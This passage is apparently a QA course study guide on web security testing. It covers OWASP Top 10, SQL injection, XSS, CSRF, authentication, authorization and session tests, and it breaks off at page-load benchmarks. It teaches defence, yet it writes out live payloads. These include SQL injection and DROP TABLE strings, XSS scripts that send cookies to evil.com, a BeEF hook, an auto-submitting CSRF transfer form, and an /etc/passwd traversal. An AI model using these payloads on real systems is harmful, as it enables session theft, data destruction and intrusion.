# Day 9: Web Application Testing - Part 2
## Comprehensive Study Guide

---

## Table of Contents
1. [Security Testing Basics](#security-testing-basics)
2. [Performance Testing Manual Aspects](#performance-testing-manual-aspects)
3. [Database Testing](#database-testing)
4. [API Testing Fundamentals](#api-testing-fundamentals)
5. [Practical Exercises](#practical-exercises)
6. [Assessment Questions](#assessment-questions)

---

## Security Testing Basics

### 1.1 Introduction to Security Testing

**Definition:** Security testing identifies vulnerabilities, threats, and risks in software applications to prevent malicious attacks and data breaches.

**Why Security Testing Matters:**
```
Statistics (2025):
- 43% of cyber attacks target small businesses
- Average cost of data breach: $4.45 million
- 95% of security breaches due to human error
- SQL injection accounts for 27% of web vulnerabilities
- 60% of companies go out of business within 6 months of a major cyber attack

Your Role as QA:
✓ First line of defense
✓ Identify vulnerabilities before hackers do
✓ Protect user data and privacy
✓ Ensure regulatory compliance (GDPR, HIPAA, PCI-DSS)
✓ Maintain brand reputation
```

**Security Testing Types:**
```
1. Vulnerability Testing: Find weaknesses
2. Penetration Testing: Simulate attacks (ethical hacking)
3. Security Scanning: Automated tool scanning
4. Risk Assessment: Evaluate potential threats
5. Security Auditing: Compliance verification
6. Ethical Hacking: Authorized hacking attempts
7. Posture Assessment: Overall security evaluation
```

---

### 1.2 OWASP Top 10 (2021)

**OWASP:** Open Web Application Security Project

**Top 10 Web Application Security Risks:**

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
OWASP TOP 10 - 2021
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. A01:2021 – Broken Access Control (↑ from #5)
   Risk: Users access unauthorized resources
   Examples:
   - View other users' data by changing URL parameter
   - Access admin panel without authorization
   - Bypass authentication by manipulating cookies

2. A02:2021 – Cryptographic Failures (↓ from #2, formerly Sensitive Data Exposure)
   Risk: Sensitive data exposed due to weak encryption
   Examples:
   - Passwords stored in plain text
   - Data transmitted over HTTP (not HTTPS)
   - Weak encryption algorithms (MD5, SHA1)

3. A03:2021 – Injection (↓ from #1)
   Risk: Untrusted data sent to interpreter
   Examples:
   - SQL Injection
   - Command Injection
   - LDAP Injection
   - XML Injection

4. A04:2021 – Insecure Design (NEW)
   Risk: Missing or ineffective security controls
   Examples:
   - No rate limiting on login (brute force attacks)
   - No account lockout policy
   - Poor threat modeling

5. A05:2021 – Security Misconfiguration (↓ from #6)
   Risk: Insecure default configurations
   Examples:
   - Default admin credentials not changed
   - Directory listing enabled
   - Unnecessary features enabled
   - Detailed error messages expose internal details

6. A06:2021 – Vulnerable and Outdated Components (↓ from #9)
   Risk: Using components with known vulnerabilities
   Examples:
   - Using jQuery 1.0 (has known XSS vulnerabilities)
   - Outdated WordPress plugins
   - Unpatched libraries

7. A07:2021 – Identification and Authentication Failures (↓ from #2)
   Risk: Weak authentication mechanisms
   Examples:
   - Weak password requirements
   - Session ID in URL
   - No multi-factor authentication
   - Session doesn't expire

8. A08:2021 – Software and Data Integrity Failures (NEW)
   Risk: Code/data from untrusted sources
   Examples:
   - Using CDN without integrity checks
   - Insecure deserialization
   - Auto-updates without verification

9. A09:2021 – Security Logging and Monitoring Failures (↓ from #10)
   Risk: Insufficient logging, delayed detection
   Examples:
   - Login failures not logged
   - No alerts for suspicious activity
   - Logs not reviewed

10. A10:2021 – Server-Side Request Forgery (SSRF) (NEW)
    Risk: Application fetches remote resource without validation
    Examples:
    - Fetch URL from user input
    - Access internal resources from public endpoint
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

### 1.3 SQL Injection Testing

**What is SQL Injection?**
```
SQL Injection: Inserting malicious SQL code through application inputs to manipulate database queries.

Impact:
- Steal entire database
- Modify/delete data
- Bypass authentication
- Execute admin operations
```

**How SQL Injection Works:**

**Vulnerable Code Example:**
```python
# VULNERABLE CODE (Never do this!)
username = request.POST['username']
password = request.POST['password']

query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
result = database.execute(query)

if result:
    login_successful()
```

**Attack Scenario:**
```
Normal Input:
Username: john
Password: pass123
Query: SELECT * FROM users WHERE username='john' AND password='pass123'
Result: Returns John's record if credentials correct

SQL Injection Attack:
Username: admin' --
Password: anything
Query: SELECT * FROM users WHERE username='admin' -- ' AND password='anything'
                                            ↑ Comment symbol (ignores rest)
Result: Returns admin record WITHOUT checking password!

Why it works:
- The -- comments out the password check
- Query becomes: SELECT * FROM users WHERE username='admin'
- Attacker logs in as admin without knowing password
```

**SQL Injection Test Cases:**

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SQL INJECTION TEST SCENARIOS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TC-SQL-001: Basic SQL Injection - Authentication Bypass
Input: Username = admin' OR '1'='1
       Password = anything
Expected: ✗ Should NOT log in
         ✓ Error message OR no results
Attack Query: SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
Explanation: '1'='1' is always true, bypasses authentication

TC-SQL-002: Comment-based SQL Injection
Input: Username = admin'--
       Password = (empty)
Expected: ✗ Should NOT log in
Attack Query: SELECT * FROM users WHERE username='admin'-- AND password=''
Explanation: -- comments out password check

TC-SQL-003: Union-based SQL Injection
Input: Search = ' UNION SELECT username, password FROM users--
Expected: ✗ Should NOT expose data
Attack: Retrieves all usernames and passwords
Secure app: Escapes input, query fails safely

TC-SQL-004: Blind SQL Injection - Boolean
Input: ProductID = 1' AND 1=1--
Expected: Returns product (true condition)
Input: ProductID = 1' AND 1=2--
Expected: No product (false condition)
Attack: Infer database structure by true/false responses
Secure app: Parameterized queries prevent this

TC-SQL-005: Blind SQL Injection - Time-based
Input: ProductID = 1'; WAITFOR DELAY '00:00:05'--
Expected: ✗ Response should NOT delay 5 seconds
Attack: Uses time delays to infer information
Secure app: Delays don't occur

TC-SQL-006: Second-order SQL Injection
Step 1: Register user with username = admin'--
Step 2: Later, app uses this username in another query
Attack: Malicious payload stored, executed later
Secure app: Escapes data both when storing AND retrieving

TC-SQL-007: Error-based SQL Injection
Input: ID = 1'
Expected: ✗ Generic error message
         ✗ NO database error details exposed
Bad response: "SQL syntax error near '1''"
Good response: "Invalid input" or "An error occurred"
Attack: Database errors reveal structure

TC-SQL-008: Stored Procedure Injection
Input: Username = '; DROP TABLE users--
Expected: ✗ Should NOT execute
Attack: Attempts to delete users table
Secure app: Parameterized stored procedures

TC-SQL-009: LIKE operator injection
Input: Search = %' OR '1'='1
Expected: ✗ Should NOT return all records
Attack Query: SELECT * FROM products WHERE name LIKE '%' OR '1'='1'
Result: Returns all products

TC-SQL-010: ORDER BY injection
Input: Sort = price; DROP TABLE products--
Expected: ✗ Should NOT execute DROP
Attack: Attempts to inject command after ORDER BY
Secure app: Whitelist allowed sort columns

TESTING TOOLS:
- sqlmap (automated SQL injection tool)
- Burp Suite
- OWASP ZAP
- Manual testing with payloads

PREVENTION VERIFICATION:
✓ Parameterized queries/prepared statements used
✓ Input validation (whitelist approach)
✓ Least privilege database accounts
✓ Error messages don't reveal database details
✓ Input escaping/sanitization
✓ ORM (Object-Relational Mapping) used
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

**Secure Code Example:**
```python
# SECURE CODE (Use parameterized queries)
username = request.POST['username']
password = request.POST['password']

# Using parameterized query
query = "SELECT * FROM users WHERE username=? AND password=?"
result = database.execute(query, (username, password))

# Now SQL injection attempts are treated as literal strings:
# Username: admin' OR '1'='1
# Query searches for username literally equal to "admin' OR '1'='1"
# Not interpreted as SQL code!
```

---

### 1.4 Cross-Site Scripting (XSS) Testing

**What is XSS?**
```
XSS: Injecting malicious JavaScript into web pages viewed by other users.

Types:
1. Reflected XSS: Payload in URL, executed immediately
2. Stored XSS: Payload stored in database, executed when viewed
3. DOM-based XSS: Vulnerability in client-side JavaScript

Impact:
- Steal session cookies
- Redirect users to malicious sites
- Deface website
- Keylogging
- Steal sensitive data
```

**XSS Attack Examples:**

**1. Reflected XSS:**
```
Vulnerable URL:
https://example.com/search?q=<script>alert('XSS')</script>

If page displays search query without sanitizing:
<h1>Search results for: <script>alert('XSS')</script></h1>

Browser executes the script!

Malicious Use:
https://example.com/search?q=<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>

Attacker sends link to victim → Victim's cookies stolen
```

**2. Stored XSS:**
```
Scenario: Blog comment section

Attacker posts comment:
"Great article! <script>
  var cookie = document.cookie;
  fetch('https://evil.com/steal?data=' + cookie);
</script>"

If stored in database and displayed without sanitization:
Every user who views the page → Script executes → Cookies stolen

Impact: Affects ALL users, not just one
```

**3. DOM-based XSS:**
```javascript
// Vulnerable JavaScript code
var name = location.hash.substring(1);
document.getElementById('welcome').innerHTML = "Welcome, " + name;

URL: https://example.com/#<img src=x onerror=alert('XSS')>
Result: Script executes in user's browser
```

**XSS Test Cases:**

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
CROSS-SITE SCRIPTING (XSS) TEST SCENARIOS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TC-XSS-001: Basic XSS - Script tag
Input: <script>alert('XSS')</script>
Where: Search box, comment field, any text input
Expected: ✗ Script should NOT execute
         ✓ Input sanitized/escaped
         ✓ Displays as plain text: <script>alert('XSS')</script>

TC-XSS-002: Image tag XSS
Input: <img src=x onerror=alert('XSS')>
Expected: ✗ Script should NOT execute
Secure display: &lt;img src=x onerror=alert('XSS')&gt;

TC-XSS-003: SVG XSS
Input: <svg onload=alert('XSS')>
Expected: ✗ Script should NOT execute

TC-XSS-004: Event handler XSS
Input: <body onload=alert('XSS')>
Input: <div onmouseover=alert('XSS')>Hover me</div>
Expected: ✗ Scripts should NOT execute

TC-XSS-005: JavaScript protocol
Input: <a href="javascript:alert('XSS')">Click</a>
Expected: ✗ Link should NOT execute JavaScript
         ✓ href sanitized or blocked

TC-XSS-006: Encoded XSS
Input: %3Cscript%3Ealert('XSS')%3C/script%3E (URL encoded)
Input: &#60;script&#62;alert('XSS')&#60;/script&#62; (HTML entity encoded)
Expected: ✗ Decoded and executed? Should NOT!
         ✓ Multiple layers of encoding handled

TC-XSS-007: Case variation
Input: <ScRiPt>alert('XSS')</ScRiPt>
Input: <SCRIPT>alert('XSS')</SCRIPT>
Expected: ✗ Should NOT bypass filters
         ✓ Case-insensitive sanitization

TC-XSS-008: Attribute XSS
Input: " onmouseover="alert('XSS')
Context: <input type="text" value="USER_INPUT">
Result: <input type="text" value="" onmouseover="alert('XSS')">
Expected: ✗ Should NOT allow attribute injection
         ✓ Input properly escaped in attributes

TC-XSS-009: Stored XSS in profile
Steps:
1. Update profile bio: <script>alert('XSS')</script>
2. View profile
Expected: ✗ Script should NOT execute
         ✓ Display as plain text

TC-XSS-010: Stored XSS in comments
Steps:
1. Post comment with XSS payload
2. View page with comment
Expected: ✗ Script should NOT execute
         ✓ Sanitized before storing OR before displaying

TC-XSS-011: DOM-based XSS via URL
URL: https://example.com/#<img src=x onerror=alert('XSS')>
JavaScript: location.hash used in innerHTML
Expected: ✗ Script should NOT execute
         ✓ Use textContent or sanitize hash value

TC-XSS-012: XSS in search results
Search: <b>bold text</b>
Display: "Search results for: <b>bold text</b>"
Question: Should HTML work?
If yes: Risk of XSS
If no: Must escape all HTML

TC-XSS-013: Cookie stealing attempt
Payload: <script>
  fetch('https://evil.com?cookie='+document.cookie)
</script>
Expected: ✗ Should NOT execute
Mitigation: HttpOnly cookies (JavaScript can't access)

TC-XSS-014: BeEF (Browser Exploitation Framework) hook
Payload: <script src="http://evil.com/hook.js"></script>
Expected: ✗ External script should NOT load
Mitigation: Content Security Policy (CSP)

TC-XSS-015: Markdown/Rich Text Editor XSS
Input: [Click me](javascript:alert('XSS'))
Expected: ✗ JavaScript protocol should NOT work in links
         ✓ Markdown parser sanitizes output

TC-XSS-016: File upload XSS
Upload: malicious.html with <script>alert('XSS')</script>
Expected: ✗ File served with safe Content-Type
         ✓ X-Content-Type-Options: nosniff header
         ✗ File NOT served from main domain

TC-XSS-017: XSS in error messages
Trigger error with: '; alert('XSS'); '
Error displays: "Invalid input: '; alert('XSS'); '"
Expected: ✗ Script should NOT execute in error message

TC-XSS-018: XSS via custom headers
Set HTTP header: X-Custom-Header: <script>alert('XSS')</script>
If app displays headers: Risk of XSS
Expected: ✓ Headers sanitized before display

TC-XSS-019: Template injection XSS
Input: {{7*7}}
If displays: 49 → Template injection exists
Expected: ✗ Template syntax should NOT evaluate
         ✓ Rendered as plain text

TC-XSS-020: Filter bypass attempts
Input: <scr<script>ipt>alert('XSS')</scr</script>ipt>
Input: <script>al\u0065rt('XSS')</script>
Input: <iframe src=javascript:alert('XSS')>
Expected: ✗ None should bypass filters
         ✓ Comprehensive sanitization

PREVENTION VERIFICATION:
✓ All user input escaped/sanitized
✓ Content Security Policy (CSP) header set
✓ HttpOnly flag on session cookies
✓ X-XSS-Protection header enabled
✓ Input validation (whitelist approach)
✓ Output encoding appropriate for context (HTML, JavaScript, URL)
✓ Use security libraries (DOMPurify, OWASP Java Encoder)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

**Secure Coding Practices:**
```javascript
// BAD: Direct insertion
element.innerHTML = userInput;

// GOOD: Use textContent (doesn't parse HTML)
element.textContent = userInput;

// GOOD: Use library to sanitize
var clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;

// GOOD: Escape HTML entities
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}
```

---

### 1.5 Cross-Site Request Forgery (CSRF) Testing

**What is CSRF?**
```
CSRF: Tricking users into executing unwanted actions on a web application where they're authenticated.

How it works:
1. User logs into bank.com (gets session cookie)
2. User visits evil.com (while still logged in)
3. evil.com contains hidden form that posts to bank.com
4. Form auto-submits using user's session
5. Bank.com thinks user intentionally made request
6. Money transferred without user's knowledge

Impact:
- Unauthorized fund transfers
- Email address changes
- Password resets
- Data modification
- Privilege escalation
```

**CSRF Attack Example:**

```html
<!-- Attacker's website: evil.com -->
<html>
<body>
  <h1>Free iPhone! Click here!</h1>

  <!-- Hidden form that submits to victim site -->
  <form id="csrf-form" action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to_account" value="attacker_account_123">
    <input type="hidden" name="amount" value="10000">
  </form>

  <script>
    // Auto-submit form when page loads
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>

When victim visits evil.com while logged into bank.com:
→ Form submits automatically
→ Uses victim's session cookie
→ Bank processes transfer
→ $10,000 sent to attacker
```

**CSRF Test Cases:**

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
CROSS-SITE REQUEST FORGERY (CSRF) TEST SCENARIOS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TC-CSRF-001: Money transfer without CSRF token
Test:
1. Login to app
2. Find transfer form
3. Copy form HTML
4. Create separate HTML file with same form
5. Open HTML file in browser
6. Submit form

Expected: ✗ Transfer should FAIL
         ✓ "CSRF token missing" error
Vulnerable: Transfer succeeds without token

TC-CSRF-002: Reusing CSRF token
Test:
1. Get CSRF token from form
2. Submit form (token used)
3. Try to submit again with same token

Expected: ✗ Should fail
         ✓ "CSRF token invalid or expired" error
Vulnerable: Same token works multiple times

TC-CSRF-003: CSRF token in GET request
Test: If sensitive operation uses GET
URL: https://bank.com/delete-account?id=123&csrf=abc

Expected: ✗ Sensitive operations should NOT use GET
         ✓ Use POST, PUT, DELETE (never GET)
Vulnerable: Can trigger via <img src="URL"> or link click

TC-CSRF-004: CSRF token bypass with empty value
Test:
1. Get legitimate request
2. Change csrf_token parameter to empty: csrf_token=
3. Submit

Expected: ✗ Should fail
Vulnerable: Accepts empty token

TC-CSRF-005: CSRF token bypass with removed parameter
Test:
1. Get legitimate request
2. Remove csrf_token parameter entirely
3. Submit

Expected: ✗ Should fail
         ✓ "Missing CSRF token" error
Vulnerable: Accepts request without token

TC-CSRF-006: Cross-origin CSRF
Test:
1. Create attacker website
2. Add form posting to victim site
3. Auto-submit form

Expected: ✗ Should fail due to:
         ✓ CSRF token protection
         ✓ SameSite cookie attribute
         ✓ Origin/Referer header check

TC-CSRF-007: CSRF token validation
Test: Use valid token from User A's session in User B's request

Expected: ✗ Should fail
         ✓ Token tied to specific user session
Vulnerable: Any valid token accepted

TC-CSRF-008: JSON CSRF
Test:
<form action="https://bank.com/api/transfer" method="POST"
      enctype="text/plain">
  <input name='{"to":"attacker","amount":10000,"csrf":"' value='"}'>
</form>

Expected: ✗ Should fail
         ✓ Content-Type validation
         ✓ Reject non-JSON requests to JSON endpoints

TC-CSRF-009: State-changing GET requests
Find: Actions using GET
Examples:
- /delete-user?id=123
- /approve-transaction?id=456
- /add-admin?user=attacker

Expected: ✗ These should NOT exist
         ✓ All state changes use POST/PUT/DELETE

TC-CSRF-010: Double-submit cookie
Test:
1. Check if CSRF token also in cookie
2. Verify server compares form token with cookie token

Expected: ✓ Both must match
Vulnerable: Only checks one or neither

TC-CSRF-011: Logout CSRF
Test: Force user logout via CSRF

Expected: Less critical but still annoying
Mitigation: CSRF protection on logout too

TC-CSRF-012: Password change CSRF
Test: Change user's password without their consent

Expected: ✗ Should require:
         ✓ CSRF token
         ✓ Current password
         ✓ Email confirmation

TC-CSRF-013: File upload CSRF
Test: Upload malicious file via CSRF

Expected: ✗ Should fail
         ✓ CSRF protection on upload endpoints

TC-CSRF-014: Custom header requirement
Test: Send request without custom header
Example: X-Requested-With: XMLHttpRequest

Expected: ✓ API requires custom header
         ✓ Browsers don't send custom headers in CSRF
Defense: Simple requests can't have custom headers

TC-CSRF-015: SameSite cookie attribute
Check: Cookie settings

Expected: ✓ SameSite=Lax or SameSite=Strict
Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly

Lax: Cookie sent with top-level navigation
Strict: Cookie only sent from same site

PREVENTION VERIFICATION:
✓ CSRF tokens present on all state-changing operations
✓ Tokens unique per session
✓ Tokens expire appropriately
✓ Tokens tied to user session
✓ SameSite cookie attribute set
✓ No state changes via GET requests
✓ Origin/Referer header validation
✓ Double-submit cookie pattern (if applicable)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

### 1.6 Authentication and Authorization Testing

**Authentication:** Verifying identity (Who are you?)
**Authorization:** Verifying permissions (What can you do?)

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
AUTHENTICATION TESTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TC-AUTH-001: Password strength requirements
Test weak passwords:
- "password" (common word)
- "12345678" (sequential numbers)
- "aaaaaaaa" (repeated characters)
- "password1" (dictionary + number)

Expected: ✗ All should be rejected
Required:
✓ Minimum 8 characters
✓ At least 1 uppercase
✓ At least 1 lowercase
✓ At least 1 number
✓ At least 1 special character
✓ Not in common password list

TC-AUTH-002: Brute force protection
Test:
1. Attempt login 10 times with wrong password
2. Check if account locked

Expected: ✓ Account locked after N failed attempts
         ✓ Lockout duration: 15-30 minutes OR
         ✓ CAPTCHA appears after 3 failures
         ✓ Alert email sent to user

TC-AUTH-003: Username enumeration
Test:
Login with: existing_user / wrong_password
Error: "Incorrect password"

Login with: nonexistent_user / wrong_password
Error: "User not found"

Expected: ✗ Should NOT reveal if username exists
         ✓ Generic error: "Invalid credentials"
Vulnerable: Attacker can discover valid usernames

TC-AUTH-004: Login credential stuffing
Test: Try 100 username/password combos from data breach

Expected: ✓ Rate limiting kicks in
         ✓ CAPTCHAs appear
         ✓ Suspicious activity detected

TC-AUTH-005: Session timeout
Test:
1. Login
2. Leave inactive for X minutes
3. Try to access protected resource

Expected: ✓ Session expired
         ✓ Redirect to login
         ✓ Timeout configurable (default: 15-30 min)

TC-AUTH-006: Password reset security
Test:
1. Request password reset
2. Check reset link

Expected: ✓ Link contains random token (not user ID)
         ✓ Token expires (15-60 minutes)
         ✓ Token single-use only
         ✓ Old password invalidated after reset
         ✓ Email sent to registered email only

TC-AUTH-007: Password reset token predictability
Test: Request multiple password resets, analyze tokens

Expected: ✓ Tokens are random, unpredictable
         ✗ Tokens should NOT be sequential
         ✗ Tokens should NOT be based on timestamp alone

TC-AUTH-008: Remember Me functionality
Test:
1. Login with "Remember Me" checked
2. Close browser
3. Reopen and visit site

Expected: ✓ Still logged in
         ✓ Uses separate long-lived token (not session)
         ✓ Token can be revoked in settings
         ✓ Stored securely (hashed in database)

TC-AUTH-009: Logout functionality
Test:
1. Login
2. Logout
3. Press Back button
4. Try to access protected page

Expected: ✗ Cannot access protected pages
         ✓ Session fully destroyed
         ✓ Cookies cleared

TC-AUTH-010: Multi-factor authentication (MFA)
Test: If MFA enabled
1. Enter correct username/password
2. MFA prompt appears

Expected: ✓ SMS code / Authenticator app / Email code required
         ✓ Code expires (5-10 minutes)
         ✓ Limited retry attempts
         ✓ Cannot bypass MFA

TC-AUTH-011: Password change requires current password
Test: Try to change password

Expected: ✓ Must enter current password first
         ✗ Should NOT allow change with just email link
         ✗ Should NOT allow change with just session

TC-AUTH-012: Session fixation
Attack:
1. Attacker gets session ID: abc123
2. Victim logs in with session ID abc123
3. Attacker uses abc123 to access victim's account

Expected: ✓ New session ID generated on login
         ✗ Old session ID invalid

TC-AUTH-013: Concurrent sessions
Test:
1. Login on Device A
2. Login on Device B

Expected: Either:
✓ Both sessions allowed (user can manage active sessions)
OR
✓ Device A session terminated
OR
✓ Alert sent to user about new login

TC-AUTH-014: OAuth/SSO security
Test: Login with Google/Facebook

Expected: ✓ Secure OAuth flow
         ✓ State parameter prevents CSRF
         ✓ Tokens stored securely
         ✓ Can revoke access

TC-AUTH-015: Password in URL
Test: Check if password ever in URL

Expected: ✗ NEVER in URL (e.g., /login?password=secret)
         ✓ Always in POST body
         ✗ Not in browser history
         ✗ Not in server logs

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
AUTHORIZATION TESTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TC-AUTHZ-001: Horizontal privilege escalation
Users: User A (ID: 100), User B (ID: 101)

Test:
1. Login as User A
2. Try to access User B's data:
   /profile?user_id=101
   /orders?user_id=101
   /api/user/101

Expected: ✗ Access denied
         ✓ Can only access own data
Vulnerable: Can view/modify other users' data

TC-AUTHZ-002: Vertical privilege escalation
Users: Regular user, Admin

Test:
1. Login as regular user
2. Try to access admin URLs:
   /admin
   /admin/users
   /api/admin/delete-user

Expected: ✗ Access denied
         ✓ 403 Forbidden
Vulnerable: Regular user can access admin functions

TC-AUTHZ-003: Insecure direct object references (IDOR)
Test:
1. Access own order: /order/12345 (allowed)
2. Change ID: /order/12346 (someone else's order)

Expected: ✗ Access denied
Vulnerable: Can access by guessing IDs

TC-AUTHZ-004: Path traversal
Test: Try to access:
- /admin/../../../etc/passwd
- /user/../../admin/panel

Expected: ✗ Access denied
         ✓ Path normalized, traversal blocked

TC-AUTHZ-005: API authorization
Test:
1. Get API endpoint (e.g., /api/v1/users/123)
2. Try without authentication
3. Try with wrong user's token

Expected: ✗ 401 Unauthorized (no auth)
         ✗ 403 Forbidden (wrong auth)

TC-AUTHZ-006: Missing function-level access control
Test:
1. Find API endpoints using tools
2. Try endpoints without proper role

Example: Regular user tries:
POST /api/admin/create-admin-user

Expected: ✗ 403 Forbidden
Vulnerable: Function executes for any authenticated user

TC-AUTHZ-007: Parameter tampering
Test:
1. Normal request: {"user_id": 100, "role": "user"}
2. Tampered: {"user_id": 100, "role": "admin"}

Expected: ✗ Role change rejected
         ✓ Server validates role from session, not request

TC-AUTHZ-008: JWT token manipulation
Test:
1. Get JWT token
2. Decode, change "role": "admin"
3. Re-encode, use modified token

Expected: ✗ Invalid signature
         ✓ Token tampering detected

TC-AUTHZ-009: Resource ownership
Test:
1. User A creates resource (e.g., document ID 456)
2. User B tries to delete document 456

Expected: ✗ Access denied
         ✓ Only owner can modify

TC-AUTHZ-010: Forced browsing
Test: Try URLs without proper authentication:
- /admin
- /dashboard
- /reports/confidential

Expected: ✗ Redirect to login OR 403 Forbidden

TC-AUTHZ-011: Role-based access control (RBAC)
Roles: Viewer, Editor, Admin

Test: Login as Viewer, try to:
- View data ✓ Allowed
- Edit data ✗ Denied
- Delete data ✗ Denied
- Manage users ✗ Denied

Expected: Permissions strictly enforced

TC-AUTHZ-012: Privilege creep
Test: User promoted to Editor, then demoted to Viewer

Expected: ✓ Old permissions revoked immediately
         ✓ Cannot use old session to retain Editor access

TC-AUTHZ-013: Hidden fields/disabled buttons
Test:
1. Admin panel hides "Delete All Users" button for regular users
2. Use browser DevTools to find the endpoint
3. Try to call endpoint directly

Expected: ✗ Server-side check blocks action
         ✓ Never rely solely on client-side hiding

TC-AUTHZ-014: API vs Web inconsistency
Test:
1. Regular user blocked from admin panel (Web)
2. Same user tries admin API endpoint

Expected: ✓ Both Web and API enforce same authorization

TC-AUTHZ-015: Mass assignment vulnerability
Test: POST /api/user/update
Body: {"email": "new@example.com", "is_admin": true}

Expected: ✗ "is_admin" field ignored
         ✓ Only allowed fields updated
         ✓ Whitelist of updatable fields

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

### 1.7 Session Management Testing

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SESSION MANAGEMENT SECURITY TESTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TC-SESS-001: Session ID in URL
Test: Check if session ID in URL
Bad: https://example.com/page?sessionid=abc123

Expected: ✗ Session ID should NEVER be in URL
         ✓ Session ID in cookie only
Risk: URLs logged, shared, bookmarked → session hijacking

TC-SESS-002: Session ID predictability
Test: Login multiple times, collect session IDs

Example IDs:
- 1001, 1002, 1003 (sequential) ✗ VERY BAD
- 2025-01-10-001 (timestamp-based) ✗ BAD
- 8f7d3c2b1a... (random cryptographic) ✓ GOOD

Expected: ✓ Cryptographically random
         ✓ Long enough (128+ bits)

TC-SESS-003: Session ID length
Test: Check session ID length

Expected: ✓ Minimum 128 bits (16 bytes)
         ✓ 32+ characters if hex encoded
Example: a3f5c9d2e8b7... (32 characters)

TC-SESS-004: Session fixation
Attack:
1. Attacker gets session ID: abc123
2. Attacker sends victim link with ?sessionid=abc123
3. Victim logs in with that session ID
4. Attacker uses abc123 to access victim's account

Expected: ✓ New session ID generated after login
         ✓ Old session ID invalidated

TC-SESS-005: Session hijacking via XSS
Attack: Steal session via: document.cookie

Expected: ✓ HttpOnly flag on cookies
         ✓ JavaScript cannot access session cookie

Cookie setting:
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax

TC-SESS-006: Session hijacking via network sniffing
Attack: Intercept session cookie on public WiFi

Expected: ✓ HTTPS only (Secure flag on cookie)
         ✓ All pages use HTTPS, not just login

TC-SESS-007: Absolute session timeout
Test:
1. Login
2. Stay active for 8 hours
3. Try action

Expected: ✓ Force logout after absolute timeout
         ✓ Even if active (security policy)

TC-SESS-008: Idle session timeout
Test:
1. Login
2. Idle for 30 minutes
3. Try action

Expected: ✓ Session expired
         ✓ Redirect to login
         ✓ Clear message

TC-SESS-009: Session timeout warning
Test:
1. Login
2. Idle for 28 minutes (2 min before timeout)

Expected: ✓ Warning popup: "Session expires in 2 minutes"
         ✓ Option to extend session

TC-SESS-010: Logout destroys session
Test:
1. Login, note session ID
2. Logout
3. Try to reuse session ID

Expected: ✗ Session ID invalid
         ✓ Cannot reuse after logout

TC-SESS-011: Multiple concurrent sessions
Test:
1. Login on Device A (session A)
2. Login on Device B (session B)
3. Verify both work OR first session terminated

Expected: Policy-dependent:
Option 1: Both sessions allowed
Option 2: First session terminated
Option 3: User can manage active sessions

TC-SESS-012: Session storage
Test: Check where session data stored

Expected: ✓ Server-side storage (database, Redis)
         ✗ NOT in client-side localStorage
         ✗ NOT in URL
Risk: Client-side storage vulnerable to XSS

TC-SESS-013: Cross-subdomain session leaking
Domains: app.example.com, admin.example.com

Test: Login to app.example.com
Check: Session accessible from admin.example.com?

Expected: Depends on Cookie domain attribute
Cookie: session=abc; domain=.example.com (shared)
Cookie: session=abc; domain=app.example.com (not shared)

✓ Appropriate domain setting for security

TC-SESS-014: Session regeneration
Test: After login, check session ID

Expected: ✓ New session ID generated
         ✓ Different from pre-login session ID
When: After login, privilege escalation, password change

TC-SESS-015: Token-based sessions (JWT)
Test: Check JWT structure

Expected: ✓ Signed (cannot tamper)
         ✓ Expiration time set (exp claim)
         ✓ Not too long-lived (15-30 min for access tokens)
         ✓ Refresh token for renewal
         ✓ Revocation mechanism exists

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

## Performance Testing Manual Aspects

### 2.1 Page Load Time Testing

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PAGE LOAD TIME TESTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

INDUSTRY BENCHMARKS:
- < 1 second: Excellent (users feel instant)
- 1-2 seconds: Good
- 2-3 seconds: Acceptable
